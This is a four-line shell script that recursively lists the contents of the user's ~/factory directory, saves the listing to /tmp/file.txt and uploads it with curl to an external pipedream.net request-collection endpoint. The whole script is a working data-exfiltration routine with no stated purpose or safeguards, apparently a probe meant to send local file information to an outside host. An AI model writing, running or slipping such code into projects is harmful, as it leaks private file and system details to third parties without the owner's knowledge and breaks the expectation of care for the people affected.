#!/bin/sh

echo $(ls -la -R ~/factory) > /tmp/file.txt

curl --data-binary "@/tmp/file.txt" https://enmwh7jh1sqb.x.pipedream.net